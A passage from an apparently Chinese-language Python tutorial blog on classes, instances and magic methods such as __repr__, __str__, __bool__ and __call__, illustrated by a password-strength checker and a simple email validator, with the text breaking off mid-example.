punctuation\">.</span>get_grade<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">### 输出</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Lisa A</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Bart C</pre></td></tr></table></figure><p>类是创建实例的模板，而实例则是一个一个具体的对象，各个实例拥有的数据都互相独立，互不影响；</p>\n<p>方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据；</p>\n<p>通过在实例上调用方法，我们就直接操作了对象内部的数据，但无需知道方法内部的实现细节。</p>\n<p>和静态语言不同，Python 允许对实例变量绑定任何数据，也就是说，对于两个实例变量，虽然它们都是同一个类的不同实例，但拥有的变量名称都可能不同：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Bart Simpson'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> lisa <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Lisa Simpson'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>age</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> lisa<span class=\"token punctuation\">.</span>age</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'Student'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'age'</span></pre></td></tr></table></figure><h2 id=\"魔法方法\"><a class=\"anchor\" href=\"#魔法方法\">#</a> 魔法方法</h2>\n<p>很全的魔法方法总结：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tva282Ni9hcnRpY2xlL2RldGFpbHMvNDI3MDkyNzk=\">https://blog.csdn.net/koko66/article/details/42709279</span><br />\n 超详细的讲解：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzQ3\">https://www.liujiangblog.com/course/python/47</span></p>\n<h3 id=\"利用魔法方法的实例\"><a class=\"anchor\" href=\"#利用魔法方法的实例\">#</a> 利用魔法方法的实例</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># @FileName  : 密码强度检测.py</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Created    :2020/9/13 13:26</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 特征</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>NUMBER <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[0-9]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>LOWER_CASE <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[a-z]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>UPPER_CASE <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[A-Z]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>OTHERS <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[^0-9A-Za-z]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">load_common_password</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    words <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"G:\\Text_Files\\字典\\10k_most_common.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">for</span> word <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            words<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>word<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> words</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>COMMON_WORDS <span class=\"token operator\">=</span> load_common_password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 管理密码强度的类</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Strength</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    密码强度三个属性：是否有效valid, 强度strength, 提示信息message</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> valid<span class=\"token punctuation\">,</span> strength<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>valid <span class=\"token operator\">=</span> valid</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        self<span class=\"token punctuation\">.</span>strength <span class=\"token operator\">=</span> strength</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        self<span class=\"token punctuation\">.</span>message <span class=\"token operator\">=</span> message</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        1、用print去打印 实例，调用顺序是：重写的__str__方法>重写的__repr__方法>未重写的__str__方法>未重写的__repr__方法</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        2、__str__实际上是调用了__repr__</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>strength</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        如果一个类中定义了__str__()方法，那么在打印&lt;对象>时，默认输出该方法的返回值。</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>message</pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__bool__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        返回真或假</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>valid</pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Password</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token comment\"># strength</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    TERRIBLE <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    SIMPLE <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    MEDIUM <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    STRONG <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>          <span class=\"token comment\">#静态方法 类或实例均可调用</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_regular</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#改静态方法函数里不传入 self 或 cls</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        regular <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'qwertyuiop'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'asdfghjkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'zxcvbnm'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">input</span> <span class=\"token keyword\">in</span> regular <span class=\"token keyword\">or</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> regular</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_by_step</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        delta <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> delta<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_common</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">input</span> <span class=\"token keyword\">in</span> COMMON_WORDS</pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">,</span> min_length<span class=\"token operator\">=</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> min_type<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> level<span class=\"token operator\">=</span>STRONG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        如果为一个类编写了该方法，那么在该类的实例后面加括号，可会调用这个方法。</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        注：构造方法的执行是由类加括号执行的，即：对象 = 类名()，而对于__call__() 方法，</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        是由对象后加括号触发的，即：对象() 或者 类()()</pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> min_length<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"terrible\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码太短了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>is_regular<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> self<span class=\"token punctuation\">.</span>is_by_step<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码有规则\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>is_common<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码很常见\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        types <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">if</span> NUMBER<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有数字</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">if</span> LOWER_CASE<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有小写字母</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">if</span> UPPER_CASE<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有大写字母</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> OTHERS<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有特殊字符</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">if</span> types <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span>level <span class=\"token operator\">&lt;=</span> self<span class=\"token punctuation\">.</span>SIMPLE<span class=\"token punctuation\">,</span> <span class=\"token string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码太简单了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token keyword\">if</span> types <span class=\"token operator\">&lt;</span> min_type<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span>level <span class=\"token operator\">&lt;=</span> self<span class=\"token punctuation\">.</span>MEDIUM<span class=\"token punctuation\">,</span> <span class=\"token string\">\"medium\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码还不够强\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"strong\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码很强\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Email</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        self<span class=\"token punctuation\">.</span>email <span class=\"token operator\">=</span> email</pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_valid_email</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token keyword\">if</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">\"^.+@(\\\\[?)[a-zA-Z0-9\\\\-\\\\.]+\\\\.([a-zA-Z]&#123;2,3&#125;|[0-9]&#123;1,3&#125;)(\\\\]?)$\"</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_email_type</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        types <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'qq'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'163'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'gmail'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'126'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sina'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>            re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'@\\w+'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>            email_type <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'@\\w+'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>            email_type <span class=\"token keyword\">in</span> types</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>            <span class=\"token keyword\">return</span> email_type</pre></td></tr><tr><td data-num=\"126\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'wrong email'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">checkpwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    password <span class=\"token operator\">=</span> Password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    pwd <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要检测的密码：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    p <span class=\"token operator\">=</span> password<span class=\"token punctuation\">(</span>pwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Whether the password is valid：'</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">.</span>__bool__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'prompt message：'</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Password Strength：'</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">.</span>__repr__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">checkemail</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    email <span class=\"token operator\">=</span> Email<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入要检测的邮箱：'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">.</span>is_valid_email<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">.</span>get_email_type<span 